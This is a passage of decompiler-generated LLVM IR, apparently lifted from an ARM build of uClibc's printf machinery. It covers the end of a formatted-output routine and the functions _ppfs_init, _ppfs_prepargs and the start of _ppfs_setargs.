  %stack_var_-336.3.ph = phi i32 [ %v0_12540, %dec_label_pc_125cc ], [ %v0_12470, %dec_label_pc_12684 ], [ %v0_12470, %dec_label_pc_12710 ], [ %v0_12540, %.thread85 ]
  %v0_127d8.pr = load i32, i32* @r6, align 4
  br label %dec_label_pc_127d8

dec_label_pc_127d8:                               ; preds = %dec_label_pc_127d8thread-pre-split, %dec_label_pc_12700, %dec_label_pc_126b8, %dec_label_pc_127c8
  %v1_127dc = phi i32 [ %v1_127dc.pre, %dec_label_pc_127d8thread-pre-split ], [ %storemerge97, %dec_label_pc_12700 ], [ %v3_126c4, %dec_label_pc_126b8 ], [ %v6_12650, %dec_label_pc_127c8 ]
  %v0_127dc = phi i32 [ %v0_127dc.pre, %dec_label_pc_127d8thread-pre-split ], [ 0, %dec_label_pc_12700 ], [ 0, %dec_label_pc_126b8 ], [ %v0_127c8, %dec_label_pc_127c8 ]
  %v0_127e4 = phi i32 [ %v0_127d8.pr, %dec_label_pc_127d8thread-pre-split ], [ 11, %dec_label_pc_12700 ], [ 11, %dec_label_pc_126b8 ], [ 11, %dec_label_pc_127c8 ]
  %v0_12824 = phi i32 [ %stack_var_-336.3.ph, %dec_label_pc_127d8thread-pre-split ], [ %v0_12470, %dec_label_pc_12700 ], [ %v0_12470, %dec_label_pc_126b8 ], [ %v0_12470, %dec_label_pc_127c8 ]
  %v7_127d8 = icmp eq i32 %v0_127e4, 11
  %v2_127dc = add i32 %v1_127dc, %v0_127dc
  br i1 %v7_127d8, label %dec_label_pc_127f4, label %bb173

bb173:                                            ; preds = %dec_label_pc_127d8
  %v7_127ec = icmp sgt i32 %v0_127e4, 5
  %. = select i1 %v7_127ec, i32 2, i32 1
  %v2_127f0 = add i32 %v2_127dc, %.
  br label %dec_label_pc_127f4

dec_label_pc_127f4:                               ; preds = %dec_label_pc_127d8, %bb173
  %v0_12808 = phi i32 [ %v2_127dc, %dec_label_pc_127d8 ], [ %v2_127f0, %bb173 ]
  store i32 %tmp98, i32* %r2.global-to-local, align 4
  %v3_127f8 = icmp uge i32 %tmp98, %v0_12808
  %v9_127f8 = icmp eq i32 %tmp98, %v0_12808
  %v2_127fc = xor i1 %v9_127f8, true
  %v3_127fc = and i1 %v3_127f8, %v2_127fc
  br i1 %v3_127fc, label %bb174, label %bb175

bb174:                                            ; preds = %dec_label_pc_127f4
  %v2_127f8 = sub i32 %tmp98, %v0_12808
  store i32 %v2_127f8, i32* @sl, align 4
  br label %bb175

bb175:                                            ; preds = %dec_label_pc_127f4, %bb174
  store i32 %v1_12808, i32* %r2.global-to-local, align 4
  %v2_12804 = xor i1 %v3_127f8, true
  %v3_12804 = or i1 %v9_127f8, %v2_12804
  br i1 %v3_12804, label %bb176, label %._crit_edge

._crit_edge:                                      ; preds = %bb175
  %v1_1280c.pre = load i32, i32* @sl, align 4
  br label %bb177

bb176:                                            ; preds = %bb175
  store i32 0, i32* @sl, align 4
  br label %bb177

bb177:                                            ; preds = %._crit_edge, %bb176
  %v2_1281c = phi i32 [ %v1_1280c.pre, %._crit_edge ], [ 0, %bb176 ]
  %v2_12808 = add i32 %v0_12808, %v1_12808
  %v2_1280c = add i32 %v2_12808, %v2_1281c
  %v0_12818 = load i32, i32* @sb, align 4
  %v7_12818 = icmp eq i32 %v0_12818, 48
  br i1 %v7_12818, label %bb178, label %.thread30

bb178:                                            ; preds = %bb177
  %v3_1281c = add i32 %v2_1281c, %v0_127dc
  store i32 %v3_1281c, i32* @r8, align 4
  store i32 0, i32* @sl, align 4
  br label %.thread30

.thread30:                                        ; preds = %bb177, %bb178
  %v0_12834 = phi i32 [ %v2_1281c, %bb177 ], [ 0, %bb178 ]
  %v1_12824 = and i32 %v0_12824, 8
  store i32 %v1_12824, i32* @r7, align 4
  %v2_12824 = icmp eq i32 %v1_12824, 0
  br i1 %v2_12824, label %dec_label_pc_1282c, label %dec_label_pc_12848

dec_label_pc_1282c:                               ; preds = %.thread30
  %v0_1282c = load i32, i32* @fp, align 4
  store i32 %v0_1282c, i32* %r0.global-to-local, align 4
  store i32 %v0_12834, i32* %r2.global-to-local, align 4
  %v4_12838 = call i32 @_charpad(i32 %v0_1282c, i8 32, i32 %v0_12834)
  store i32 %v4_12838, i32* %r0.global-to-local, align 4
  %v1_1283c = load i32, i32* @sl, align 4
  %v9_1283c = icmp eq i32 %v4_12838, %v1_1283c
  br i1 %v9_1283c, label %dec_label_pc_12844, label %dec_label_pc_12930

dec_label_pc_12844:                               ; preds = %dec_label_pc_1282c
  %v0_12844 = load i32, i32* @r7, align 4
  store i32 %v0_12844, i32* @sl, align 4
  %v0_12850.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_12848

dec_label_pc_12848:                               ; preds = %.thread30, %dec_label_pc_12844
  %v0_12850 = phi i32 [ %v0_127e4, %.thread30 ], [ %v0_12850.pre, %dec_label_pc_12844 ]
  %v0_1284c = load i32, i32* @fp, align 4
  %v2_12850 = add i32 %v0_12850, add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -37172)
  store i32 %v2_12850, i32* %r0.global-to-local, align 4
  %v2_12854 = inttoptr i32 %v2_12850 to i8*
  %v3_12854 = call i32 @__GI_fputs_unlocked(i8* %v2_12854, i32 %v0_1284c)
  %v0_12858 = load i32, i32* @fp, align 4
  store i32 %v0_12858, i32* %r0.global-to-local, align 4
  %v0_12860 = load i32, i32* @r8, align 4
  store i32 %v0_12860, i32* %r2.global-to-local, align 4
  %v4_12864 = call i32 @_charpad(i32 %v0_12858, i8 48, i32 %v0_12860)
  store i32 %v4_12864, i32* %r0.global-to-local, align 4
  %v1_12868 = load i32, i32* @r8, align 4
  %v9_12868 = icmp eq i32 %v4_12864, %v1_12868
  br i1 %v9_12868, label %dec_label_pc_12870, label %dec_label_pc_12930

dec_label_pc_12870:                               ; preds = %dec_label_pc_12848
  %v3_12870 = load i32, i32* %stack_var_-44, align 4
  %v2_12874 = icmp eq i32 %v3_12870, 0
  br i1 %v2_12874, label %dec_label_pc_1287c, label %dec_label_pc_128a0

dec_label_pc_1287c:                               ; preds = %dec_label_pc_12870
  %v0_1287c = load i32, i32* @r5, align 4
  %v2_1287c = icmp eq i32 %v0_1287c, 0
  br i1 %v2_1287c, label %dec_label_pc_12904, label %dec_label_pc_12884

dec_label_pc_12884:                               ; preds = %dec_label_pc_1287c
  %v0_12884 = load i32, i32* @r4, align 4
  store i32 %v0_12884, i32* %r0.global-to-local, align 4
  %v0_1288c = load i32, i32* @fp, align 4
  store i32 %v0_1288c, i32* %r2.global-to-local, align 4
  %v3_12890 = inttoptr i32 %v0_1288c to i16*
  %v4_12890 = call i32 @__stdio_fwrite(i32 %v0_12884, i32 %v0_1287c, i16* %v3_12890)
  store i32 %v4_12890, i32* %r0.global-to-local, align 4
  %v1_12894 = load i32, i32* @r5, align 4
  %v9_12894 = icmp eq i32 %v4_12890, %v1_12894
  br i1 %v9_12894, label %dec_label_pc_12904, label %dec_label_pc_12930

dec_label_pc_128a0:                               ; preds = %dec_label_pc_12870
  store i32 %v2_12744, i32* @r6, align 4
  store i32 %v2_12640, i32* @r8, align 4
  store i32 %v2_1264c, i32* @r7, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v0_128f0.pr = load i32, i32* @r5, align 4
  %v2_128f041 = icmp eq i32 %v0_128f0.pr, 0
  store i32 %v2_12640, i32* @r1, align 4
  store i32 %v2_12744, i32* @r0, align 4
  br i1 %v2_128f041, label %dec_label_pc_12904, label %dec_label_pc_128b8

dec_label_pc_128b8:                               ; preds = %dec_label_pc_128a0, %dec_label_pc_128ec
  %v1_128bc = phi i32 [ %v2_128ec, %dec_label_pc_128ec ], [ %v0_128f0.pr, %dec_label_pc_128a0 ]
  %v2_128b8 = icmp ult i32 %v1_128bc, 128
  %.v1_128bc = select i1 %v2_128b8, i32 %v1_128bc, i32 128
  store i32 %.v1_128bc, i32* %r2.global-to-local, align 4
  %v6_128c4 = call i32 @__GI_wcsrtombs(i32 %v2_12744, i32 %v2_12640, i32 %.v1_128bc, i32 %v2_1264c, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_128c4, i32* @r4, align 4
  %v2_128c8 = icmp eq i32 %v6_128c4, 0
  store i32 %v6_128c4, i32* %r0.global-to-local, align 4
  br i1 %v2_128c8, label %dec_label_pc_128ec, label %dec_label_pc_128d4

dec_label_pc_128d4:                               ; preds = %dec_label_pc_128b8
  store i32 %v2_12744, i32* %r0.global-to-local, align 4
  %v0_128dc = load i32, i32* @fp, align 4
  store i32 %v0_128dc, i32* %r2.global-to-local, align 4
  %v3_128e0 = inttoptr i32 %v0_128dc to i16*
  %v4_128e0 = call i32 @__stdio_fwrite(i32 %v2_12744, i32 %v6_128c4, i16* %v3_128e0)
  store i32 %v4_128e0, i32* %r0.global-to-local, align 4
  %v1_128e4 = load i32, i32* @r4, align 4
  %v9_128e4 = icmp eq i32 %v4_128e0, %v1_128e4
  br i1 %v9_128e4, label %dec_label_pc_128ec, label %dec_label_pc_12930

dec_label_pc_128ec:                               ; preds = %dec_label_pc_128d4, %dec_label_pc_128b8
  %v0_128ec = phi i32 [ %v4_128e0, %dec_label_pc_128d4 ], [ 0, %dec_label_pc_128b8 ]
  %v1_128ec = load i32, i32* @r5, align 4
  %v2_128ec = sub i32 %v1_128ec, %v0_128ec
  store i32 %v2_128ec, i32* @r5, align 4
  %v2_128f0 = icmp eq i32 %v2_128ec, 0
  store i32 %v2_12640, i32* @r1, align 4
  store i32 %v2_12744, i32* @r0, align 4
  br i1 %v2_128f0, label %dec_label_pc_12904, label %dec_label_pc_128b8

dec_label_pc_12904:                               ; preds = %dec_label_pc_128ec, %dec_label_pc_128a0, %dec_label_pc_12884, %dec_label_pc_1287c
  %v0_12904 = load i32, i32* @fp, align 4
  store i32 %v0_12904, i32* %r0.global-to-local, align 4
  %v0_1290c = load i32, i32* @sl, align 4
  store i32 %v0_1290c, i32* %r2.global-to-local, align 4
  %v4_12910 = call i32 @_charpad(i32 %v0_12904, i8 32, i32 %v0_1290c)
  store i32 %v4_12910, i32* %r0.global-to-local, align 4
  %v1_12914 = load i32, i32* @sl, align 4
  %v9_12914 = icmp eq i32 %v4_12910, %v1_12914
  br i1 %v9_12914, label %dec_label_pc_1291c, label %dec_label_pc_12930

dec_label_pc_1291c:                               ; preds = %dec_label_pc_12904, %dec_label_pc_127a8, %dec_label_pc_12604, %dec_label_pc_12414
  %stack_var_-336.4 = phi i32 [ %v0_12470, %dec_label_pc_12414 ], [ %v0_12824, %dec_label_pc_12904 ], [ %v0_12470, %dec_label_pc_127a8 ], [ %v0_12470, %dec_label_pc_12604 ]
  %stack_var_-356.3 = phi i32 [ %v1_12808, %dec_label_pc_12414 ], [ %v2_1280c, %dec_label_pc_12904 ], [ %v2_127ac, %dec_label_pc_127a8 ], [ %v2_12608, %dec_label_pc_12604 ]
  %v3_1291c = load i32, i32* %stack_var_-352, align 4
  store i32 %v3_1291c, i32* @r4, align 4
  store i32 %v3_1291c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1233c.outer

dec_label_pc_12928:                               ; preds = %dec_label_pc_12398
  %v1_12928 = add i32 %v0_123a0, 2
  store i32 %v1_12928, i32* @r4, align 4
  br label %dec_label_pc_1233c.outer36

dec_label_pc_12930:                               ; preds = %dec_label_pc_127b8, %dec_label_pc_1263c, %dec_label_pc_12904, %dec_label_pc_12884, %dec_label_pc_12848, %dec_label_pc_1282c, %dec_label_pc_12780, %dec_label_pc_12664, %dec_label_pc_125dc, %bb142, %dec_label_pc_128d4
  br label %dec_label_pc_12938

dec_label_pc_12938:                               ; preds = %dec_label_pc_1238c, %bb, %dec_label_pc_122d0, %dec_label_pc_12930
  %stack_var_-356.4 = phi i32 [ -1, %bb ], [ -1, %dec_label_pc_122d0 ], [ -1, %dec_label_pc_12930 ], [ %v1_12808, %dec_label_pc_1238c ]
  store i32 %stack_var_-356.4, i32* %r0.global-to-local, align 4
  store i32 %v6_12280, i32* @r5, align 4
  store i32 %v12_12280, i32* %r7.global-to-local, align 4
  store i32 %v18_12280, i32* @sb, align 4
  store i32 %v21_12280, i32* @sl, align 4
  store i32 %v24_12280, i32* @fp, align 4
  ret i32 %stack_var_-356.4

; uselistorder directives
  uselistorder i32 %stack_var_-356.4, { 1, 0 }
  uselistorder i32 %v1_12928, { 1, 0 }
  uselistorder i32 %v3_1291c, { 1, 2, 0 }
  uselistorder i32 %v2_128ec, { 1, 2, 0 }
  uselistorder i32 %v0_12834, { 1, 0 }
  uselistorder i32 %v2_1281c, { 2, 0, 1 }
  uselistorder i1 %v9_127f8, { 1, 0 }
  uselistorder i32 %v2_127dc, { 1, 0 }
  uselistorder i32 %v0_12824, { 1, 0 }
  uselistorder i32 %v0_127dc, { 1, 0 }
  uselistorder i32 %v1_127b8, { 1, 0 }
  uselistorder i32 %v1_12780, { 1, 0, 2 }
  uselistorder i32 %v3_12750, { 1, 2, 0 }
  uselistorder i32 %v0_126bc, { 1, 0 }
  uselistorder i32 %v2_126ac, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v5_12674, { 1, 2, 0, 3 }
  uselistorder i32 %v3_125ec, { 1, 0 }
  uselistorder i32 %v2_1254c, { 2, 3, 0, 4, 5, 1, 6 }
  uselistorder i32 %v0_12568, { 1, 2, 3, 0 }
  uselistorder i32 %v2_124e8, { 2, 1, 0, 3, 4, 7, 5, 6 }
  uselistorder i32 %v4_12450, { 0, 2, 1, 3 }
  uselistorder i32 %v1_123f4.pre, { 1, 0, 2 }
  uselistorder i32 %v1_123ec, { 1, 0 }
  uselistorder i32 %v1_12398, { 0, 1, 3, 2 }
  uselistorder i32 %v1_12808, { 0, 8, 1, 7, 2, 3, 6, 5, 4, 9 }
  uselistorder i32 %v2_12358, { 1, 0 }
  uselistorder i32 %v1_12350.lcssa, { 1, 0 }
  uselistorder i8 %v2_1233c, { 1, 0 }
  uselistorder i32 %v2_12350, { 0, 2, 3, 1 }
  uselistorder i32 %stack_var_-356.1.ph37, { 1, 0 }
  uselistorder i32 %v5_12368, { 0, 1, 3, 2 }
  uselistorder i32 %v0_12470, { 6, 4, 3, 15, 14, 5, 0, 1, 13, 12, 11, 7, 10, 8, 2, 9 }
  uselistorder i1 %v7_12560, { 1, 0 }
  uselistorder i1 %v7_124b0, { 1, 2, 0 }
  uselistorder i1 %v7_1269c, { 1, 0 }
  uselistorder i1 %v7_12614, { 1, 0 }
  uselistorder i1 %v7_124f0, { 1, 0 }
  uselistorder i32 %v2_1264c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_12640, { 1, 2, 3, 0, 6, 4, 5, 7 }
  uselistorder i32 %v2_12744, { 1, 2, 3, 4, 5, 0, 11, 10, 9, 7, 8, 6 }
  uselistorder i32 %v2_123f0, { 1, 3, 2, 0 }
  uselistorder i32 %v4_123cc, { 1, 0 }
  uselistorder i32 %v2_12288, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-352, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32 %tmp105, { 1, 2, 0 }
  uselistorder i32 %tmp104, { 12, 8, 9, 0, 10, 11, 3, 4, 5, 6, 7, 1, 2, 15, 14, 13 }
  uselistorder i32 %tmp98, { 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 4, 5, 6, 21, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 22, 23, 24, 26, 25, 3, 27, 28, 29, 30, 31, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 7, 5, 6, 9, 8, 10, 12, 11, 17, 13, 14, 15, 16, 18, 19, 22, 20, 21, 24, 23, 26, 25, 28, 27, 30, 29, 33, 31, 32, 36, 37, 34, 35, 38, 39, 1, 48, 41, 40, 43, 42, 45, 44, 47, 46, 0 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -52756), { 1, 0 }
  uselistorder i8 10, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 19, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_12938, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_12930, { 2, 10, 3, 4, 5, 0, 6, 7, 1, 8, 9 }
  uselistorder label %dec_label_pc_128b8, { 1, 0 }
  uselistorder label %dec_label_pc_12848, { 1, 0 }
  uselistorder label %.thread30, { 1, 0 }
  uselistorder label %bb177, { 1, 0 }
  uselistorder label %bb175, { 1, 0 }
  uselistorder label %dec_label_pc_127f4, { 1, 0 }
  uselistorder label %dec_label_pc_127d8, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_127d8thread-pre-split, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_12700, { 1, 0 }
  uselistorder label %dec_label_pc_126b8, { 1, 0 }
  uselistorder label %dec_label_pc_125cc, { 0, 2, 1 }
  uselistorder label %bb171, { 1, 0 }
  uselistorder label %bb169, { 4, 1, 2, 0, 3 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %bb162, { 1, 0 }
  uselistorder label %bb160, { 4, 3, 1, 0, 2 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %dec_label_pc_124a0, { 1, 0 }
  uselistorder label %dec_label_pc_1249c, { 2, 1, 0 }
  uselistorder label %bb151, { 2, 1, 0 }
  uselistorder label %dec_label_pc_123e8, { 1, 0 }
  uselistorder label %bb146, { 1, 0 }
  uselistorder label %dec_label_pc_1238c, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %dec_label_pc_12358, { 1, 0, 2 }
  uselistorder label %bb138, { 1, 0 }
  uselistorder label %dec_label_pc_1233c.outer36, { 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_12968 = load i32, i32* @r4, align 4
  %v6_12968 = load i32, i32* @r5, align 4
  store i32 152, i32* @r2, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_12974 = load i32, i32* @r1, align 4
  store i32 %v0_12974, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_12980 = bitcast i32* %arg1 to i8*
  %v3_12980 = call i32 @__GI_memset(i8* %v2_12980, i32 0)
  store i32 %v3_12980, i32* %r0.global-to-local, align 4
  %v0_12984 = load i32, i32* @r4, align 4
  %v1_12984 = add i32 %v0_12984, 24
  %v2_12984 = inttoptr i32 %v1_12984 to i32*
  %v3_12984 = load i32, i32* %v2_12984, align 4
  store i32 %v3_12984, i32* %r3.global-to-local, align 4
  %v0_12988 = load i32, i32* @r5, align 4
  %v2_12988 = inttoptr i32 %v0_12984 to i32*
  store i32 %v0_12988, i32* %v2_12988, align 4
  %v0_1298c = load i32, i32* %r3.global-to-local, align 4
  %v1_1298c = add i32 %v0_1298c, -1
  %v1_12990 = load i32, i32* @r4, align 4
  %v2_12990 = add i32 %v1_12990, 24
  %v3_12990 = inttoptr i32 %v2_12990 to i32*
  store i32 %v1_1298c, i32* %v3_12990, align 4
  %v0_12994 = load i32, i32* @r4, align 4
  %v1_12994 = add i32 %v0_12994, 40
  store i32 %v1_12994, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v2_129a421 = inttoptr i32 %v1_12994 to i32*
  store i32 8, i32* %v2_129a421, align 4
  %v3_129a422 = load i32, i32* %r2.global-to-local, align 4
  %v4_129a423 = add i32 %v3_129a422, 4
  store i32 %v4_129a423, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_129a0.dec_label_pc_129a0_crit_edge

dec_label_pc_129a0.dec_label_pc_129a0_crit_edge:  ; preds = %entry, %dec_label_pc_129a0.dec_label_pc_129a0_crit_edge
  %v4_129a424 = phi i32 [ %v4_129a423, %entry ], [ %v4_129a4, %dec_label_pc_129a0.dec_label_pc_129a0_crit_edge ]
  %v0_129a0.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_129a4.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_129a0 = add i32 %v0_129a0.pre, -1
  store i32 %v1_129a0, i32* %r3.global-to-local, align 4
  %v7_129a0 = icmp eq i32 %v0_129a0.pre, 1
  %v2_129a4 = inttoptr i32 %v4_129a424 to i32*
  store i32 %v0_129a4.pre, i32* %v2_129a4, align 4
  %v3_129a4 = load i32, i32* %r2.global-to-local, align 4
  %v4_129a4 = add i32 %v3_129a4, 4
  store i32 %v4_129a4, i32* %r2.global-to-local, align 4
  br i1 %v7_129a0, label %dec_label_pc_129ac, label %dec_label_pc_129a0.dec_label_pc_129a0_crit_edge

dec_label_pc_129ac:                               ; preds = %dec_label_pc_129a0.dec_label_pc_129a0_crit_edge
  %v0_129ac = load i32, i32* @r5, align 4
  store i32 %v0_129ac, i32* %r2.global-to-local, align 4
  %v1_129ec2 = inttoptr i32 %v0_129ac to i8*
  %v2_129ec3 = load i8, i8* %v1_129ec2, align 1
  %v3_129ec4 = zext i8 %v2_129ec3 to i32
  store i32 %v3_129ec4, i32* %r0.global-to-local, align 4
  %v2_129f05 = icmp eq i8 %v2_129ec3, 0
  br i1 %v2_129f05, label %dec_label_pc_129f8, label %dec_label_pc_129b4

dec_label_pc_129b4:                               ; preds = %dec_label_pc_129ac, %dec_label_pc_129ec.backedge
  %v0_129bc = phi i32 [ %storemerge, %dec_label_pc_129ec.backedge ], [ %v0_129ac, %dec_label_pc_129ac ]
  %v0_129b4 = phi i32 [ %v3_129ec, %dec_label_pc_129ec.backedge ], [ %v3_129ec4, %dec_label_pc_129ac ]
  %v7_129b4 = icmp eq i32 %v0_129b4, 37
  br i1 %v7_129b4, label %dec_label_pc_129bc, label %dec_label_pc_129e8

dec_label_pc_129bc:                               ; preds = %dec_label_pc_129b4
  %v1_129bc = add i32 %v0_129bc, 1
  %v2_129bc = inttoptr i32 %v1_129bc to i8*
  %v3_129bc = load i8, i8* %v2_129bc, align 1
  %v4_129bc = zext i8 %v3_129bc to i32
  store i32 %v4_129bc, i32* %r3.global-to-local, align 4
  store i32 %v1_129bc, i32* %r2.global-to-local, align 4
  %v7_129c0 = icmp eq i8 %v3_129bc, 37
  br i1 %v7_129c0, label %dec_label_pc_129e8, label %dec_label_pc_129c8

dec_label_pc_129c8:                               ; preds = %dec_label_pc_129bc
  %v1_129c8 = load i32, i32* @r4, align 4
  %v2_129c8 = inttoptr i32 %v1_129c8 to i32*
  store i32 %v1_129bc, i32* %v2_129c8, align 4
  %v0_129cc = load i32, i32* @r4, align 4
  store i32 %v0_129cc, i32* %r0.global-to-local, align 4
  %v1_129d0 = inttoptr i32 %v0_129cc to i8*
  %v2_129d0 = call i32 @_ppfs_parsespec(i8* %v1_129d0)
  store i32 %v2_129d0, i32* %r0.global-to-local, align 4
  %v1_129d4 = icmp slt i32 %v2_129d0, 0
  br i1 %v1_129d4, label %dec_label_pc_129fc.loopexit, label %dec_label_pc_129e0

dec_label_pc_129e0:                               ; preds = %dec_label_pc_129c8
  %v0_129e0 = load i32, i32* @r4, align 4
  %v1_129e0 = inttoptr i32 %v0_129e0 to i32*
  %v2_129e0 = load i32, i32* %v1_129e0, align 4
  br label %dec_label_pc_129ec.backedge

dec_label_pc_129e8:                               ; preds = %dec_label_pc_129b4, %dec_label_pc_129bc
  %v0_129e8 = phi i32 [ %v0_129bc, %dec_label_pc_129b4 ], [ %v1_129bc, %dec_label_pc_129bc ]
  %v1_129e8 = add i32 %v0_129e8, 1
  br label %dec_label_pc_129ec.backedge

dec_label_pc_129ec.backedge:                      ; preds = %dec_label_pc_129e8, %dec_label_pc_129e0
  %storemerge = phi i32 [ %v1_129e8, %dec_label_pc_129e8 ], [ %v2_129e0, %dec_label_pc_129e0 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_129ec = inttoptr i32 %storemerge to i8*
  %v2_129ec = load i8, i8* %v1_129ec, align 1
  %v3_129ec = zext i8 %v2_129ec to i32
  store i32 %v3_129ec, i32* %r0.global-to-local, align 4
  %v2_129f0 = icmp eq i8 %v2_129ec, 0
  br i1 %v2_129f0, label %dec_label_pc_129ec.dec_label_pc_129f8_crit_edge, label %dec_label_pc_129b4

dec_label_pc_129ec.dec_label_pc_129f8_crit_edge:  ; preds = %dec_label_pc_129ec.backedge
  %v0_129f8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_129f8

dec_label_pc_129f8:                               ; preds = %dec_label_pc_129ec.dec_label_pc_129f8_crit_edge, %dec_label_pc_129ac
  %v0_129f8 = phi i32 [ %v0_129f8.pre, %dec_label_pc_129ec.dec_label_pc_129f8_crit_edge ], [ %v0_129ac, %dec_label_pc_129ac ]
  %v1_129f8 = load i32, i32* @r4, align 4
  %v2_129f8 = inttoptr i32 %v1_129f8 to i32*
  store i32 %v0_129f8, i32* %v2_129f8, align 4
  %v1_12a04.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_129fc

dec_label_pc_129fc.loopexit:                      ; preds = %dec_label_pc_129c8
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_129fc

dec_label_pc_129fc:                               ; preds = %dec_label_pc_129fc.loopexit, %dec_label_pc_129f8
  %v1_12a04 = phi i32 [ -1, %dec_label_pc_129fc.loopexit ], [ %v1_12a04.pre, %dec_label_pc_129f8 ]
  store i32 %v3_12968, i32* @r4, align 4
  store i32 %v6_12968, i32* @r5, align 4
  ret i32 %v1_12a04

; uselistorder directives
  uselistorder i32 %v3_129ec, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_129ac, { 1, 0, 2, 3 }
  uselistorder i32 %v4_129a4, { 1, 0 }
  uselistorder i32 %v0_129a0.pre, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32* %r2.global-to-local, { 2, 0, 5, 1, 6, 7, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 6, 3, 4, 2, 7, 5, 0 }
  uselistorder label %dec_label_pc_129e8, { 1, 0 }
  uselistorder label %dec_label_pc_129b4, { 1, 0 }
  uselistorder label %dec_label_pc_129a0.dec_label_pc_129a0_crit_edge, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_12a08 = load i32, i32* @r4, align 4
  store i32 %v3_12a08, i32* %stack_var_-12, align 4
  %v0_12a0c = load i32, i32* @r0, align 4
  %v1_12a0c = add i32 %v0_12a0c, 24
  %v2_12a0c = inttoptr i32 %v1_12a0c to i32*
  %v3_12a0c = load i32, i32* %v2_12a0c, align 4
  store i32 %v3_12a0c, i32* %r5.global-to-local, align 4
  store i32 %v0_12a0c, i32* @r4, align 4
  %v2_12a1c = add i32 %v0_12a0c, 76
  %v3_12a1c = inttoptr i32 %v2_12a1c to i32*
  store i32 %arg2, i32* %v3_12a1c, align 4
  %tmp5 = icmp slt i32 %v3_12a0c, 1
  br i1 %tmp5, label %dec_label_pc_12a40, label %dec_label_pc_12a24

dec_label_pc_12a24:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_12a28 = load i32, i32* @r0, align 4
  %v2_12a28 = add i32 %v1_12a28, 8
  %v3_12a28 = inttoptr i32 %v2_12a28 to i32*
  store i32 0, i32* %v3_12a28, align 4
  %v0_12a2c = load i32, i32* %r5.global-to-local, align 4
  %v1_12a2c = load i32, i32* @r0, align 4
  %v2_12a2c = add i32 %v1_12a2c, 28
  %v3_12a2c = inttoptr i32 %v2_12a2c to i32*
  store i32 %v0_12a2c, i32* %v3_12a2c, align 4
  %v0_12a30 = load i32, i32* %r3.global-to-local, align 4
  %v1_12a30 = load i32, i32* @r0, align 4
  %v2_12a30 = add i32 %v1_12a30, 24
  %v3_12a30 = inttoptr i32 %v2_12a30 to i32*
  store i32 %v0_12a30, i32* %v3_12a30, align 4
  %v0_12a34 = load i32, i32* %r3.global-to-local, align 4
  %v1_12a34 = load i32, i32* @r0, align 4
  %v2_12a34 = add i32 %v1_12a34, 4
  %v3_12a34 = inttoptr i32 %v2_12a34 to i32*
  store i32 %v0_12a34, i32* %v3_12a34, align 4
  %v0_12a38 = call i32 @_ppfs_setargs()
  store i32 %v0_12a38, i32* @r0, align 4
  %v0_12a3c = load i32, i32* %r5.global-to-local, align 4
  %v1_12a3c = load i32, i32* @r4, align 4
  %v2_12a3c = add i32 %v1_12a3c, 24
  %v3_12a3c = inttoptr i32 %v2_12a3c to i32*
  store i32 %v0_12a3c, i32* %v3_12a3c, align 4
  br label %dec_label_pc_12a40

dec_label_pc_12a40:                               ; preds = %entry, %dec_label_pc_12a24
  %v2_12a44 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_12a44, i32* @r4, align 4
  %v1_12a48 = load i32, i32* @r0, align 4
  ret i32 %v1_12a48

; uselistorder directives
  uselistorder i32 %v0_12a0c, { 1, 0, 2 }
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder label %dec_label_pc_12a40, { 1, 0 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
